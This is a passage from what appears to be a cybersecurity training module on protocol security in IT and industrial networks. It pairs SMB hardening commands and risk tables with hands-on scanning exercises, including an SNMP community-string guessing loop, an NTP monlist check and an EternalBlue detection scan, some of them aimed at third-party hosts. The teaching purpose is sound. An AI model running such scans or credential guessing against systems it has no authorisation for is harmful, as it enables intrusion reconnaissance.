Set-SmbServerConfiguration -RequireSecuritySignature $true
Set-SmbClientConfiguration -RequireSecuritySignature $true

# Enable SMB encryption (SMB 3.0+):
Set-SmbServerConfiguration -EncryptData $true
# This encrypts all SMB traffic, prevents sniffing of file contents

# Restrict anonymous access:
Set-SmbServerConfiguration -RestrictNullSessions $true

# Disable guest access:
Set-SmbServerConfiguration -EnableSMBGuestLogon $false

# Windows Firewall — block SMBv1 specifically:
# Block TCP 139 (NetBIOS Session Service — SMBv1 path)
New-NetFirewallRule -DisplayName "Block SMBv1" -Direction Inbound -Protocol TCP -LocalPort 139 -Action Block

# Audit SMB events:
Get-WinEvent -LogName "Microsoft-Windows-SMBServer/Security" | Select-Object -First 20
```

> **Key Insight:** SMBv1 caused WannaCry and NotPetya — the two most destructive cyberattacks in recorded history, totalling $14 billion in damages. SMBv1 should not exist anywhere in 2026. NTLM relay attacks exploit the absence of SMB signing — present in most enterprise networks by default. Any network where SMB signing is not required is vulnerable to complete credential relay chains that require only a foothold anywhere on the network.

---

## 12. Protocol Security Matrix

```
Protocol  Port(s)   Encryption      Auth           Known Attacks           Replace With
─────────────────────────────────────────────────────────────────────────────────────────
HTTP      80/TCP    NONE            None/Cookie    MITM, session hijack,   HTTPS
                                                  cleartext creds
HTTPS     443/TCP   TLS             Certificate    TLS downgrade, cert      Enforce TLS 1.2+,
                                   + app auth     spoofing, MITM (weak)   HSTS, cert pinning
FTP       21/TCP    NONE            Cleartext      Credential capture,      SFTP or FTPS
                   (FTPS: TLS)                    bounce attack
SFTP      22/TCP    SSH             SSH key/pass   Brute force (if pass)   —
SMTP      25/TCP    Optional        Optional       Spoofing, relay,        SPF+DKIM+DMARC,
          587/TCP   (STARTTLS)      (STARTTLS)     credential brute        enforce TLS
POP3      110/TCP   NONE            Cleartext      Credential capture       POP3S (995)
IMAP      143/TCP   NONE            Cleartext      Credential capture       IMAPS (993)
SSH       22/TCP    Yes             Key/Pass       Brute force, key theft   Key-only auth
Telnet    23/TCP    NONE            Cleartext      Credential capture       SSH
SNMP v1   161/UDP   NONE            Community str  Community brute force    SNMPv3 authPriv
SNMP v2c  161/UDP   NONE            Community str  Amplification DDoS      SNMPv3 authPriv
SNMP v3   161/UDP   AES (authPriv)  User + HMAC    Brute force (rare)      —
NTP       123/UDP   NONE (NTPsec)   None/symmetric Amplification, poison    NTPsec/auth NTP
LDAP      389/TCP   NONE            Bind           Injection, null bind     LDAPS (636)
LDAPS     636/TCP   TLS             Bind + TLS     Brute force             —
RDP       3389/TCP  TLS/CredSSP     Password/NLA   BlueKeep, brute force   NLA + VPN + MFA
SMB 1     445/TCP   NONE            NTLM           EternalBlue, relay      Disable SMBv1
SMB 3     445/TCP   Optional AES    NTLM/Kerberos  Relay (if no signing)   SMB signing + encrypt
```

---

## 13. OT/ICS Protocol Context

### 13.1 How These Protocols Appear in Industrial Environments

Industrial networks are not isolated from the protocols covered in this module. Here is the reality of their presence in OT environments:

```
Protocol     OT Presence                           Risk Level
─────────────────────────────────────────────────────────────────────────
HTTP         HMI web interfaces (WebHMI, iFIX Web) HIGH — often no TLS
             Historian web reporting interfaces    Often no auth on LAN
             PLC web configuration pages          Default credentials common
             Building automation (BACnet/SC)

HTTPS        Modern OT web interfaces (OPC-UA)    Medium — if cert is self-signed
             Remote access portals                and not validated: MITM possible

FTP          PLC firmware upload/download         CRITICAL — cleartext,
             Configuration backup/restore         often anonymous
             Some HMI data export                Default credentials
             
SFTP         Rare in OT — some modern historians  Low — if properly configured
             Modern engineering workstations

SMTP         SCADA alarm email notifications      Low direct risk
             Historian report emailing            But source for phishing

SSH          Modern managed switch management     Medium
             Engineering workstation access       Brute force if weak creds
             Some modern PLC SSH access

Telnet       Most common management protocol      CRITICAL — cleartext
             on legacy industrial switches        credential exposure
             Some legacy PLCs/RTUs               Often default credentials
             Network-accessible PLCs (Siemens)

SNMP v1/v2c  Virtually all industrial switches    HIGH — exposes full
             Industrial UPS systems               network topology
             Environmental monitoring             Read-write = config control
             Building automation devices

NTP          Time sync for SCADA servers          MEDIUM — desync = system
             IEEE 1588/PTP for protection relays  instability in OT
             PMU data timing

LDAP         SCADA servers joined to AD domain    MEDIUM — if path to OT
             Engineering workstations             from corporate AD exists

RDP          HMI remote access (common!)          HIGH — often internet-exposed
             SCADA server management              BlueKeep risk on older OT OS
             Engineering workstation access       Windows XP/7 common in OT

SMB          Windows-based SCADA file sharing     HIGH — WannaCry hit OT
             Historian data export                NotPetya destroyed OT networks
             Engineering workstation file access  SMBv1 common on legacy OT OS
```

### 13.2 Protocol Risk in OT — Special Considerations

**HMI Web Interfaces — HTTP Without TLS:**

Many SCADA and HMI systems include web servers for remote monitoring that run over HTTP with no authentication — by design, for operational simplicity. An attacker on the OT network can:
- View real-time process values
- Sometimes modify setpoints
- Always gather intelligence about the process

**RDP on Windows XP/Windows 7 in OT:**

Windows XP and Windows 7 are still common operating systems for HMI and SCADA workstations in industrial environments due to:
- Long hardware lifecycles (equipment purchased in 2005 still operational)
- Vendor support contracts tied to specific OS versions
- Concerns about patching stability in operational environments

These systems are vulnerable to BlueKeep and DejaBlue (pre-auth RDP RCE). Combined with often-absent network segmentation and monitoring, this represents a severe risk.

**SMBv1 in OT:**

WannaCry specifically impacted industrial environments in 2017:
- Honda closed production lines in Japan
- Renault halted production at multiple plants
- NHS medical equipment running Windows XP was infected

The lesson was not universally learned. SMBv1 still exists in OT environments where patching is avoided.

---

## 14. Hands-On Exercises

### Exercise 1: HTTP/HTTPS Analysis (45 minutes)

```bash
# Analyse HTTP headers for security issues

TARGET="http://testphp.vulnweb.com"  # Intentionally vulnerable test site

# Check HTTP headers:
curl -sI $TARGET | tee /tmp/http_headers.txt

# Analyse security headers:
echo "=== Security Header Analysis ==="
for header in "Strict-Transport-Security" "Content-Security-Policy" \
              "X-Frame-Options" "X-Content-Type-Options" "Referrer-Policy" \
              "Permissions-Policy"; do
    result=$(grep -i "$header" /tmp/http_headers.txt)
    if [ -z "$result" ]; then
        echo "[MISSING] $header"
    else
        echo "[PRESENT] $result"
    fi
done

# Check for server version disclosure:
echo "=== Information Disclosure ==="
grep -iE "Server:|X-Powered-By:|X-AspNet-Version:" /tmp/http_headers.txt

# Test HTTP methods:
echo "=== HTTP Methods ==="
curl -sI -X OPTIONS $TARGET | grep -i "allow:"
curl -sI -X TRACE $TARGET | head -5    # TRACE should be disabled

# Check TLS configuration (if HTTPS):
TARGET_HTTPS="https://badssl.com"
echo "=== TLS Configuration ==="
openssl s_client -connect badssl.com:443 -brief 2>/dev/null | head -10
nmap --script ssl-enum-ciphers -p 443 badssl.com 2>/dev/null | grep -E "TLSv|ciphers"
```

### Exercise 2: SMTP Enumeration and Security Check (30 minutes)

```bash
# SMTP security assessment

TARGET_MX="mail.google.com"   # Use your own domain for testing

# Check MX records:
echo "=== MX Records ==="
dig MX $TARGET_MX +short 2>/dev/null || echo "Direct mail server test"

# Test SMTP connection and capabilities:
echo "=== SMTP Banner and EHLO ==="
timeout 5 bash -c "echo 'EHLO test.com' | nc -w 3 mail.google.com 25" 2>/dev/null \
    || echo "Port 25 filtered (expected for gmail)"

# Use swaks for comprehensive SMTP test:
# swaks --to test@yourdomain.com --from test@external.com --server mail.yourdomain.com

# Check SPF/DKIM/DMARC for multiple domains:
for domain in google.com microsoft.com amazon.com; do
    echo ""
    echo "=== Email security for $domain ==="
    
    spf=$(dig TXT $domain +short | grep "v=spf1")
    dmarc=$(dig TXT _dmarc.$domain +short | grep "v=DMARC1")
    
    [ -n "$spf" ] && echo "SPF: $spf" || echo "SPF: NOT FOUND"
    [ -n "$dmarc" ] && echo "DMARC: $dmarc" || echo "DMARC: NOT FOUND"
done
```

### Exercise 3: SSH Security Assessment (45 minutes)

```bash
# SSH security configuration audit

TARGET_SSH="localhost"  # Test on your own system

# Scan SSH version and algorithms:
echo "=== SSH Version ==="
ssh -V 2>&1
nc -w 3 $TARGET_SSH 22 2>/dev/null | head -1

# Check supported algorithms:
echo "=== Supported Algorithms ==="
nmap --script ssh2-enum-algos -p 22 $TARGET_SSH 2>/dev/null

# Check sshd configuration for security issues:
echo "=== SSH Configuration Audit ==="
sudo grep -E "PermitRootLogin|PasswordAuthentication|MaxAuthTries|
    X11Forwarding|AllowTcpForwarding|LoginGraceTime|
    PermitEmptyPasswords|Ciphers|MACs|KexAlgorithms" \
    /etc/ssh/sshd_config | grep -v "^#"

# Generate secure keys:
echo "=== Generate Ed25519 Key ==="
ssh-keygen -t ed25519 -f /tmp/test_key -N "" -C "test@bytewall"
echo "Private key fingerprint:"
ssh-keygen -lf /tmp/test_key
echo "Public key:"
cat /tmp/test_key.pub
rm -f /tmp/test_key /tmp/test_key.pub

# Monitor SSH authentication attempts:
echo "=== Recent SSH Authentication Events ==="
sudo grep -E "Accepted|Failed|Invalid" /var/log/auth.log 2>/dev/null | tail -20 \
    || sudo journalctl -u ssh --since "1 hour ago" 2>/dev/null | tail -20
```

### Exercise 4: SNMP Enumeration (30 minutes)

```bash
# SNMP reconnaissance toolkit

TARGET="demo.snmplabs.com"   # Public SNMP demo server

# Test common communities:
echo "=== Testing Common Community Strings ==="
for community in public private community snmp manager; do
    result=$(snmpget -v2c -c $community -t 2 $TARGET 1.3.6.1.2.1.1.1.0 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo "[FOUND] Community: '$community'"
        echo "System: $result"
        break
    else
        echo "[FAILED] Community: '$community'"
    fi
done

# Full enumeration if community found:
echo ""
echo "=== System Information ==="
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.1 2>/dev/null

echo "=== Network Interfaces ==="
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.2.2.1.2 2>/dev/null | head -10

echo "=== IP Addresses ==="
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.4.20 2>/dev/null

# Check for monlist vulnerability (NTP amplification):
echo ""
echo "=== NTP Monlist Check ==="
TARGET_NTP="pool.ntp.org"
nmap -sU -p 123 --script ntp-monlist $TARGET_NTP 2>/dev/null | grep -E "monlist|vulnerable"
```

### Exercise 5: SMB Security Assessment (45 minutes)

```bash
# SMB security assessment on local network (lab only)

TARGET_SMB="localhost"   # Test on your own system or lab VM

# Check SMB version support:
echo "=== SMB Protocol Versions ==="
nmap --script smb-protocols -p 445 $TARGET_SMB 2>/dev/null

# Check security mode (signing):
echo "=== SMB Security Mode ==="
nmap --script smb2-security-mode -p 445 $TARGET_SMB 2>/dev/null

# List available shares (no credentials):
echo "=== Anonymous Share Enumeration ==="
smbclient -L //$TARGET_SMB -N 2>/dev/null || echo "No anonymous access (good)"

# Check for EternalBlue:
echo "=== EternalBlue Vulnerability ==="
nmap --script smb-vuln-ms17-010 -p 445 $TARGET_SMB 2>/dev/null

# Check Windows SMBv1 status (run on Windows host):
# Get-SmbServerConfiguration | Select EnableSMB1Protocol
# Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Build a complete protocol audit script:
cat > /tmp/protocol_audit.sh << 'EOF'
#!/bin/bash
TARGET=${1:-"192.168.1.1"}
echo "Protocol Security Audit: $TARGET"
echo "================================"

check_port() {
    nc -zw 1 $TARGET $1 2>/dev/null && echo "OPEN" || echo "CLOSED/FILTERED"
}

echo "[HTTP]    Port 80:  $(check_port 80)"
echo "[HTTPS]   Port 443: $(check_port 443)"
echo "[FTP]     Port 21:  $(check_port 21)"
echo "[SSH]     Port 22:  $(check_port 22)"
echo "[Telnet]  Port 23:  $(check_port 23)"
echo "[SMTP]    Port 25:  $(check_port 25)"
echo "[IMAP]    Port 143: $(check_port 143)"
echo "[IMAPS]   Port 993: $(check_port 993)"
echo "[LDAP]    Port 389: $(check_port 389)"
echo "[RDP]     Port 3389:$(check_port 3389)"
echo "[SMB]     Port 445: $(check_port 445)"

echo ""
echo "[SNMP]    UDP 161: "
nc -zuw 1 $TARGET 161 2>/dev/null && echo "OPEN" || echo "CLOSED/FILTERED"

echo ""
echo "=== Risk Assessment ==="
nc -zw 1 $TARGET 23 2>/dev/null && echo "[CRITICAL] Telnet is OPEN — cleartext protocol"
nc -zw 1 $TARGET 21 2>/dev/null && echo "[HIGH] FTP is OPEN — cleartext protocol"
nc -zw 1 $TARGET 80 2>/dev/null && echo "[MEDIUM] HTTP is OPEN — check if sensitive data exposed"
nc -zw 1 $TARGET 3389 2>/dev/null && echo "[HIGH] RDP is OPEN — check BlueKeep vulnerability and NLA"
EOF
chmod +x /tmp/protocol_audit.sh
bash /tmp/protocol_audit.sh $TARGET_SMB
```

---

## 15. Module Summary

| Protocol | Port(s) | Core Function | Primary Attacks | Critical Defence | OT/ICS Risk |
|----------|---------|---------------|-----------------|------------------|-------------|
| **HTTP** | 80/TCP | Web communication | MITM, session hijack, cleartext creds | Force HTTPS, HSTS | HMI web interfaces often HTTP |
| **HTTPS** | 443/TCP | Encrypted web | TLS downgrade, Heartbleed, BEAST | TLS 1.3, certificate pinning | Modern OT uses HTTPS, verify TLS config |
| **FTP** | 21/TCP | File transfer | Credential capture, bounce attack | Replace with SFTP | PLC firmware transfer, config backup |
| **SFTP** | 22/TCP | Secure file transfer | Brute force | Key-based auth | Preferred for OT where available |
| **SMTP** | 25,587/TCP | Email sending | Spoofing, open relay, phishing | SPF+DKIM+DMARC+TLS | SCADA alarm notifications |
| **POP3/IMAP** | 110,143/TCP | Email retrieval | Credential capture | Use TLS variants (993/995) | Email credential exposure |
| **SSH** | 22/TCP | Secure remote shell | Brute force, key theft, tunnelling | Key-only auth, no root | Modern switch management |
| **Telnet** | 23/TCP | Cleartext remote shell | Complete session capture | Replace with SSH | ENDEMIC in legacy OT — critical risk |
| **SNMP v1/v2c** | 161/UDP | Network management | Community brute force, amplification DDoS | SNMPv3 authPriv | CRITICAL — exposes full OT topology |
| **NTP** | 123/UDP | Time synchronisation | Amplification DDoS, clock poisoning | Authenticated NTP, multiple sources | OT protection relay timing critical |
| **LDAP** | 389/TCP | Directory queries | Injection, null bind, AD enumeration | LDAPS, disable null bind | Corporate AD → OT lateral movement |
| **RDP** | 3389/TCP | Graphical remote access | BlueKeep, brute force, relay, session hijack | NLA + VPN + MFA + patch | Windows HMI remote access — common |
| **SMBv1** | 445/TCP | Legacy file sharing | EternalBlue (WannaCry/NotPetya) | DISABLE — no exceptions | WannaCry hit production OT networks |
| **SMB 3** | 445/TCP | Modern file sharing | NTLM relay (without signing) | SMB signing required, encryption enabled | Windows SCADA file sharing |

---

> **Next Module:** [Stage 1.6 — Network Devices](./stage-1.6-network-devices.md)  
> **Previous Module:** [Stage 1.4 — IP Addressing and Subnetting](./stage-1.4-ip-addressing-subnetting.md)  
> **Series Index:** [Full Roadmap](../../README.md)

---

*This document is part of the Cybersecurity × OT/ICS Security Full Roadmap series. All techniques are presented for educational purposes, authorised security research, and defensive security practice. Always obtain proper authorisation before testing any system.*